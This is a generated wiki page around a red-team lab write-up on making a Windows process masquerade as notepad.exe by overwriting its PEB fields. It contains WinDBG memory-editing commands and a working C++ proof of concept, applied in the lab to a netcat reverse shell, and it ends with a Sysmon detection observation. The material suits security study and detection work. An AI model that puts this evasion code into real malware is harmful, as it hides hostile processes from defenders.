---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Masquerading Processes in Userland via \_PEB

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-masquerading-processes-in-userland-through-peb` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Masquerading Processes in Userland via \_PEB](../../topics/offensive-security/masquerading-processes-in-userland-via-peb.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-masquerading-processes-in-userland-through-peb |
| name | Masquerading Processes in Userland via \_PEB |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2018-10-23 19-47-59.png
- Screenshot from 2018-10-23 20-02-49.png
- Screenshot from 2018-10-23 23-36-52.png
- malicious-process.PNG
- masquerade-1.png
- masquerade-10.png
- masquerade-12.png
- masquerade-13.png
- masquerade-14.png
- masquerade-2.png
- masquerade-3.png
- masquerade-4.png
- masquerade-5.png
- masquerade-9.png
_body: "---\ndescription: >-\n  Understanding how malicious binaries can maquerade as any other legitimate\n  Windows binary\
  \ from the userland.\n---\n\n# Masquerading Processes in Userland via \\_PEB\n\n## Overview\n\nIn this short lab I am going\
  \ to use a WinDBG to make my malicious program pretend to look like a notepad.exe (hence masquerading) when inspecting system's\
  \ running processes with tools like Sysinternals ProcExplorer and similar. Note that this is not a [code injection](../code-injection-process-injection/)\
  \ exercise.&#x20;\n\nThis is possible, because information about the process, i.e commandline arguments, image location,\
  \ loaded modules, etc is stored in a memory structure called Process Environment Block (`_PEB`) that is accessible and writeable\
  \ from the userland.\n\n{% hint style=\"info\" %}\nThanks to [@FuzzySec](https://twitter.com/FuzzySec) who pointed out the\
  \ following:\\\n_you don't need SeDebugPrivilege when overwriting the PEB for your own process or generally for overwriting\
  \ a process spawned in your user context_\n\n[_https://twitter.com/FuzzySec/status/1090963518558482436_](https://twitter.com/FuzzySec/status/1090963518558482436)\n\
  {% endhint %}\n\nThis lab builds on the previous lab:\n\n{% content-ref url=\"../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md\"\
  \ %}\n[exploring-process-environment-block.md](../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md)\n\
  {% endcontent-ref %}\n\n## Context\n\nFor this demo, my malicious binary is going to be an `nc.exe` -  a rudimentary netcat\
  \ reverse shell spawned by cmd.exe and the PID of `4620`:\n\n![](../../.gitbook/assets/malicious-process.PNG)\n\nUsing WinDBG,\
  \ we will make the nc.exe look like notepad.exe. This will be reflected in the `Path` field and the binary icon in the process\
  \ properties view using ProcExplorer as seen in the below graphic. Note that it is the same nc.exe process (PID 4620) as\
  \ shown above, only this time masquerading as a notepad.exe:\n\n![](../../.gitbook/assets/masquerade-5.png)\n\n## Execution\n\
  \nSo how is this possible? Read on.\n\nLet's first have a look at the \\_PEB structure for the `nc.exe` process using WinDBG:\n\
  \n```csharp\ndt _peb @$peb\n```\n\n![](../../.gitbook/assets/masquerade-13.png)\n\nNote that at the offset `0x020` of the\
  \ PEB, there is another structure which is of interest to us -  `_RTL_USER_PROCESS_PARAMETERS`, which contains nc.exe process\
  \ information. Let's inspect it further:\n\n```csharp\ndt _RTL_USER_PROCESS_PARAMETERS 0x00000000`005e1f60\n```\n\n![](../../.gitbook/assets/masquerade-12.png)\n\
  \nThe offset `0x060` of `_RTL_USER_PROCESS_PARAMETERS` is also of interest to us - it contains a member `ImagePathName`\
  \ which points to a structure `_UNICODE_STRING` that, as we will see later, contains a field `Buffer` which effectively\
  \ signifies the name/full path to our malicious binary nc.exe. Note how at the offset `0x70` we can see the commandline\
  \ arguments of the malicious process, which we explored [previously](../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md).\n\
  \nLet's inspect the aforementioned `_UNICODE_STRING` structure:\n\n```csharp\ndt _UNICODE_STRING 0x00000000`005e1f60+60\n\
  ```\n\n![](../../.gitbook/assets/masquerade-10.png)\n\n`_UNICODE_STRING` structure describes the lenght of the string and\
  \ also points to the actual memory location ``0x00000000`005e280e`` by the `Buffer` field that contains the string which\
  \ is a full path to our malicious binary.\n\nLet's confirm the string location by dumping the bytes at ``0x00000000`005e280e``\
  \ by issuing the following command in WinDBG:\n\n```csharp\n0:002> du 0x00000000`005e280e\n00000000`005e280e  \"C:\\tools\\\
  nc.exe\"\n```\n\n![](../../.gitbook/assets/masquerade-9.png)\n\nNow that I have confirmed that ``0x00000000`005e280e`` indeed\
  \ contains the path to the binary, let's try to write a new string to that memory address. Say, let's try swapping the nc.exe\
  \ with a path to the notepad.exe binary found in Windows\\System32\\notepad.exe:\n\n```csharp\neu 0x00000000`005e280e \"\
  C:\\\\Windows\\\\System32\\\\notepad.exe\"\n```\n\n![](../../.gitbook/assets/masquerade-1.png)\n\n{% hint style=\"warning\"\
  \ %}\nIf you are following along, do not forget to add NULL byte at the end of your new string to terminate it:\n\n```\n\
  eb 0x00000000`005e280e+3d 0x0\n```\n{% endhint %}\n\nLet's check the `_UNICODE_STRING` structure again to see if the changes\
  \ took effect:\n\n```csharp\ndt _UNICODE_STRING 0x00000000`005e1f60+60\n```\n\n![](../../.gitbook/assets/masquerade-4.png)\n\
  \nWe can see that our string is getting truncated. This is because the `Lenght` value in the `_UNICODE_STRING` structure\
  \ is set to 0x1e (30 decimal) which equals to only 15 unicode characters:\n\n![](../../.gitbook/assets/masquerade-3.png)\n\
  \nLet's increase that value to 0x3e to accomodate our longer string pointing to notepad.exe binary and check the structure\
  \ again:\n\n```csharp\neb 0x00000000`005e1f60+60 3e\ndt _UNICODE_STRING 0x00000000`005e1f60+60\n```\n\nGood, the string\
  \ pointed to by the field `Buffer` is no longer getting truncated:\n\n![](../../.gitbook/assets/masquerade-2.png)\n\nFor\
  \ the sake of this demo, I cleared out the commandline arguments the nc.exe was launched with by amending the `_UNICODE_STRING`\
  \ structure member `Lenght` by setting it to 0:\n\n```csharp\neb 0x00000000`005e1f60+70 0x0\n```\n\nInspecting our malicious\
  \ nc.exe process again using Process Explorer reveals that it now looks like notepad without commandline arguments:\n\n\
  ![](../../.gitbook/assets/masquerade-14.png)\n\nNote that to further obfuscate the malicious binary, one could also rename\
  \ the binary itself from nc.exe to notepad.exe.\n\n## A simple PoC\n\nAs part of this simple lab, I wanted to write a simple\
  \ C++ proof of concept that would make the running program masquerade itself as a notepad. Here is the code:\n\n{% code\
  \ title=\"pebmasquerade.cpp\" %}\n```cpp\n#include \"stdafx.h\"\n#include \"Windows.h\"\n#include \"winternl.h\"\n\ntypedef\
  \ NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);\n\nint main()\n{\n\tHANDLE h = GetCurrentProcess();\n\
  \tPROCESS_BASIC_INFORMATION ProcessInformation;\n\tULONG lenght = 0;\n\tHINSTANCE ntdll;\n\tMYPROC GetProcessInformation;\n\
  \twchar_t commandline[] = L\"C:\\\\windows\\\\system32\\\\notepad.exe\";\n\tntdll = LoadLibrary(TEXT(\"Ntdll.dll\"));\n\n\
  \t//resolve address of NtQueryInformationProcess in ntdll.dll\n\tGetProcessInformation = (MYPROC)GetProcAddress(ntdll, \"\
  NtQueryInformationProcess\");\n\n\t//get _PEB object\n\t(GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation,\
  \ sizeof(ProcessInformation), &lenght);\n\n\t//replace commandline and imagepathname\n\tProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer\
  \ = commandline;\n\tProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;\n\n\treturn\
  \ 0;\n}\n```\n{% endcode %}\n\n{% file src=\"../../.gitbook/assets/pebmasquerade.exe\" %}\npebmasquerade.exe\n{% endfile\
  \ %}\n\n..and here is the compiled running program being inspected with ProcExplorer - we can see that the masquerading\
  \ is achieved successfully:\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-23 23-36-52.png>)\n\n## Observations\n\
  \nSwitching back to the nc.exe masquerading as notepad.exe, if we check the `!peb` data, we can see a notepad.exe is now\
  \ displayed in the  `Ldr.InMemoryOrderModuleList` memory structure!\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-23\
  \ 19-47-59.png>)\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess#return-value\"\
  \ %}\n\nNote that even though it shows in the loaded modules that notepad.exe was loaded, it still does not mean that there\
  \ was an actual notepad.exe process created and sysmon logs prove this, meaning commandline logging can still be helpful\
  \ in detecting this behaviour.\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-23 20-02-49.png>)\n\n## Credits\n\n\
  [@b33f](https://twitter.com/FuzzySec) for his [Masquerade-PEB.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1)\
  \ which is what originally inspired me (quite some time ago now) to explore this concept, but I never got to lay my hands\
  \ on it until now.\\\n[\\\n@Mumbai](https://twitter.com/@ilove2pwn\\_) for talking to me about C++ and NtQueryInformationProcess\n\
  \n## References\n\n{% embed url=\"https://twitter.com/fuzzysec/status/775541332513259520?lang=en\" %}\n\n{% embed url=\"\
  https://docs.microsoft.com/en-us/windows/desktop/api/winternl/ns-winternl-_peb_ldr_data\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess\"\
  \ %}"
_relative_path: offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb.md
````
